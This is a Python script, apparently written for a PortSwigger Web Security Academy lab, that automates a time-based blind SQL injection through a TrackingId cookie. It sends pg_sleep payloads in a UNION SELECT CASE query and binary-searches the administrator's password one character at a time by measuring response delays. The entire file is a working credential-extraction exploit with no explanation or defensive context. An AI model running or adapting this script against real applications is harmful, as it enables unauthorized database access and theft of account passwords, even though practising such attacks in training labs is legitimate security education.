import time
import requests
from itertools import chain

url = 'https://acde1ffa1ec23635809211d200910085.web-security-academy.net/'
cookies = {
    "TrackingId": '', 
    "session": "MaPxf83cofhv75VsC0GjqmPnJ5zlSiS0"
}
delay = 5

password = []
alphanumerics = [
        open('numbers.txt', 'r').read().split('\n'),
        open('lowercase.txt', 'r').read().split('\n')
]

# flatten
alphanumerics = list(chain.from_iterable(alphanumerics))

def getVal(i, char, op, delay=delay):
    return '\' union select case when (username=\'administrator\' and substr(password, {i},1) {op} \'{char}\') then \'\'||pg_sleep(10) else \'\'||pg_sleep(0) end from users --;'.format(i=i, char=char, op=op)

num_http_calls = 0

for i in range(1, 7):
    start = 0
    end = len(alphanumerics)
    char_i = end//2

    while True:

        char = alphanumerics[char_i]

        print('===')
        print('end: {end}'.format(end=end))
        print('start: {start}'.format(start=start))
        print('char_i: {char_i}'.format(char_i=char_i))
        print('char: {char}'.format(char=char))

        val=getVal(i, char, '=')
        print(val)
        cookies['TrackingId'] = val
        
        response = requests.get(url, cookies=cookies)
        num_http_calls += 1
        if response.elapsed.total_seconds() > delay:
            password.append(char)
            print('>> character at position [{pos}] is [{char}]. password so far: [{password}].'.format(pos=i, char=char, password=password))
            break
        else:

            val=getVal(i, char, '<')
            print(val)
            cookies['TrackingId'] = val

            response = requests.get(url, cookies=cookies)
            num_http_calls += 1
            if response.elapsed.total_seconds() > delay:
                end = char_i
                char_i = (start+end)//2
            else:
                
                val=getVal(i, char, '>')
                print(val)
                cookies['TrackingId'] = val
        
                response = requests.get(url, cookies=cookies)
                num_http_calls += 1
                if response.elapsed.total_seconds() > delay:
                    start = char_i
                    char_i = (start+end)//2
                else:
                    print('>> Error is possible: {char} is neither < nor > nor = the character in the password at position {pos}'.format(char=char, pos=i))
    print('>>> character position [{pos}] is exhausted. password so far: [{password}]'.format(pos=i, password=password))

print(''.join(password))
print('number of http calls')
print(num_http_calls)